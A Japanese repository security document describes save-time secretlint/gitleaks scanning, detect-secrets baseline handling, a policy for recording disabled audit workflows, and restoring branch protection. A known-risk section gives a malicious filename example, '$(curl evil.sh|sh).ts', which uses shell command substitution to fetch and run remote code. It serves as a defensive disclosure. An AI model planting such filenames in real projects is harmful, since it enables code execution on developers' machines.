...
4. **エディタによる保存時整形・表示除外・保存時検知 (Editor)**
   - **ツール:** VS Code の推奨拡張機能と設定ファイル (`.vscode/settings.json`, `.vscode/extensions.json`, `emeraldwalk.runonsave` 拡張機能)
   - **役割:** ローカル開発環境での保存時に自動フォーマット・Lint 適用 (`editor.formatOnSave`, `editor.codeActionsOnSave`, および `.ts`/`.tsx` に対する `editor.defaultFormatter` の明示指定) を行い、コミット前にコードスタイルの逸脱を早期に解消します。また、エディタの検索・表示対象から `.env` や各種鍵ファイル、状態ファイル、AIの一時作業ファイルなどを外す除外設定 (`search.exclude`, `files.exclude`) により、エディタ上での偶発的な閲覧・混入リスクを低減します（機密管理の補助策であり、ファイルの読み込み自体を完全に防ぐセキュリティ制御ではありません）。
   - **Shift-left 防御 (保存時 Secretlint & Gitleaks):** VS Code Marketplace には `secretlint` の公式拡張機能は存在しませんが、その代替（ワークアラウンド）として `emeraldwalk.runonsave` 拡張機能を推奨し、ファイル保存時に自動で `secretlint` および `gitleaks` が実行されるように設定 (`.vscode/settings.json`) しています。これにより、コミットフックや CI を待つことなく、タイピング・保存の直後にエディタ上でシークレット混入の早期フィードバックを得られる「Shift-left」なローカル防御を実現しています。
   - **既知の残存リスク（ファイル名経由のコマンドインジェクション）:** `emeraldwalk.runonsave` は `commands[].cmd` 内の `${file}` プレースホルダを単純な文字列置換で埋め込んだ後、その文字列を Node の `child_process.exec()`（シェル経由）でそのまま実行します（拡張機能本体の `ExtensionController.ts` の `getReplacements` → `doReplacement` → `exec(cfg.cmd, ...)`）。`"${file}"` のようにダブルクォートで囲んでいても、シェルはダブルクォート内でも `$(...)` やバッククォートのコマンド置換を評価するため、悪意あるファイル名（例: `$(curl evil.sh|sh).ts`）を保存対象として開くだけで、クォートを破らずに任意コマンドが実行され得ます（[CWE-94](https://cwe.mitre.org/data/definitions/94.html)）。この置換・実行はエディタ拡張機能側の実装であり、`scripts/run-security-scans-local.sh` 側でファイル名を検証する時点ではこのコマンド置換は既に完了しているため、本リポジトリの設定ファイル側からは修正できません。PRレビューやフォーク検証で信頼できないブランチをローカルにチェックアウトする場合は、そのブランチのファイルを開いて保存する前に、VS Code の拡張機能ビューから `emeraldwalk.runonsave` を（対象ワークスペースに限り）一時的に無効化することを推奨します。
   - **既知の制限（Windows では保存時フックが動作しない）:** `.vscode/settings.json` は `emeraldwalk.runonsave.shell` を設定していないため、Windows 環境では拡張機能が Node のデフォルトシェル（`cmd.exe`）にフォールバックします。`cmd.exe` は `scripts/run-security-scans-local.sh` の `#!/usr/bin/env bash` シェバンを解釈できずスクリプトの起動自体に失敗するため、VS Code の Output チャンネルを含めどこにも出力が出ないまま、保存時の Secretlint / Gitleaks チェックが一度も実行されない状態になります。この制限自体は本 PR 由来のものではなく（旧 `scripts/run-secretlint-local.sh` の頃から存在）、気付かれないまま「保存時に検知されているはず」という誤認を招く点が問題です。Windows でこのフックを機能させるには、`emeraldwalk.runonsave.shell` に Git Bash など bash 互換シェルを設定してください。
...
| `pr-detect-secrets-review.yml`           | 比較対象の `.secrets.baseline` を PR のベースブランチ側に固定しているため、PR 内でベースラインを更新しても検知は解除されない（`rev` 更新 PR が構造的に失敗する。握りつぶし防止とのトレードオフ） | `detect-secrets.yml`（フォーク PR を除き HEAD のベースラインを使うため同一 PR 内で解消する）                                 |
...
- `.husky/pre-push`（および VS Code 保存時フックの `scripts/run-security-scans-local.sh`）はバージョン文字列を持たず、`${XDG_CACHE_HOME:-$HOME/.cache}/gitleaks/` にキャッシュ済みのバイナリのうち**バージョン順で最新のもの**を選びます。旧版のキャッシュは消されずに残るため辞書順の先頭を選ぶと `gitleaks-8.21.2` が `gitleaks-8.30.1` より先に来てしまい、`.husky/pre-commit` の版を上げてもこれらだけ旧版で走り続けます。この選択ロジックは両方から `scripts/lib/find-gitleaks-bin.sh` の `find_latest_gitleaks_bin` として共有しています。GNU 拡張の `sort -V` は macOS 標準の BSD sort には存在せず、素の macOS 環境では静かに検知がスキップされてしまうため使用せず、バージョン文字列の各セグメントをゼロ埋めしてから通常の辞書順ソートする方式を採っています。
...
- `scripts/run-security-scans-local.sh`（VS Code 保存時フック）は `gitleaks` をダウンロードしません。上記のキャッシュディレクトリへの取得は `.husky/pre-commit` のみが行うため、**一度もコミットしていない環境では、gitleaks が `PATH` にもキャッシュにも無く保存時スキャンがスキップされます**。この場合は保存のたびに `⚠️  gitleaks が見つからないため保存時スキャンをスキップしました` と出力されるので、この警告が出ている間は保存時の Gitleaks 検知が効いていない（fail-open）と認識してください。一度コミットすれば `.husky/pre-commit` がキャッシュへ取得し、以降は保存時スキャンも動作します。
...
- **`.github/workflows/pr-detect-secrets-review.yml`（`reviewdog / detect-secrets`）は、上記のベースライン更新を同じ PR に含めても解消しません。これは不具合ではなく設計どおりの挙動です。** 同ワークフローは検知の握りつぶし（CWE-693）を防ぐため、比較対象の `.secrets.baseline` を PR のベースブランチ（信頼済みリビジョン）側に固定し、PR 側の更新を一切参照しません。そのため `rev` を更新する PR では、新しい 40 桁 SHA が `Hex High Entropy String` として必ず検知され、ベースラインが base ブランチへ取り込まれるまでこのチェックは失敗し続けます（`detect-secrets.yml` は、フォーク PR を除き HEAD の `.secrets.baseline` を使うため、こちらは同じ PR 内の更新で解消します。フォーク PR では同ワークフローも PR のベースブランチの `.secrets.baseline` を使うため、ベースラインが base ブランチへ取り込まれるまで失敗し続けます）。任意チェックのためマージはブロックされませんが、**失敗の内訳が `.pre-commit-config.yaml` の `rev` のみであることを、レビュー時にジョブログの `::error::` 出力で必ず確認してください。**
...
- **例外承認および監査ワークフロー無効化の判断:**
  本リポジトリは単独運用のため、偽陽性の除外・監査ワークフローの無効化・必須チェックの一時解除は、オーナー (@genzouw) が単独で判断します。**第三者による承認プロセスおよび承認期限は設けません。** 承認者を置かない代わりに、記録を残すことを条件とします。**ただし、無期限の放置を防ぐため、次回の「マージ後に確認すること」または週次の定期監査結果確認のタイミングで、「無効化・縮退の記録」に記載済みの項目が未解消のまま残っていないかを毎回あわせて確認します。** 見込み時期を過ぎても再有効化できない場合は、その理由と新しい見込み時期を記録に追記してください（第三者の再承認は不要ですが、記録の更新は必須です）。
- **監査ワークフローを無効化・縮退させる場合の記録義務:**
  スキャナーを無効化する、必須チェックから外す、`[allowlist]` や `.secrets.baseline` に広い範囲の除外を追加するなど、検知能力を下げる変更を行う場合は、次の 3 点を本ドキュメントの末尾「無効化・縮退の記録」に追記してから実施してください。**記録のない無効化は行いません。** **この記録は、無効化そのもの（ワークフローファイル・`.gitleaks.toml`・ブランチ保護設定などの変更）とは別のコミットで追加してください。** 同一コミットに含めると、後述の `git revert` による復旧時に記録ごと取り消され、無効化していた事実が失われます。
...
- **復旧・再有効化とロールバック:**
  無効化の解除は、無効化時のコミットを `git revert` して元に戻すことを基本とします（設定変更を手作業で再現しない）。**ただし、ブランチ保護の必須チェック設定はリポジトリ内のどのファイルにも保存されていないため、`git revert` では復元できません。** 必須チェックを外していた場合は、GitHub の Settings > Branches > Branch protection rules 画面、または以下のように `gh api` に `strict` と元の 3 件の `contexts` を含む JSON 本文を渡して（書き込み権限が必要）、先に必須チェックを元の 3 件へ明示的に復元してください。復元後、次の読み取り専用コマンドで結果を検証します。

  ```console
  $ cat <<'JSON' | gh api --method PATCH repos/genzouw/toique/branches/main/protection/required_status_checks --input -
  {"strict":true,"contexts":["zizmor / zizmor","trivy / Trivy filesystem scan","gitleaks / Scan for leaked secrets"]}
  JSON
  $ gh api repos/genzouw/toique/branches/main/protection --jq '.required_status_checks.contexts'
  ["zizmor / zizmor","trivy / Trivy filesystem scan","gitleaks / Scan for leaked secrets"]
  ```
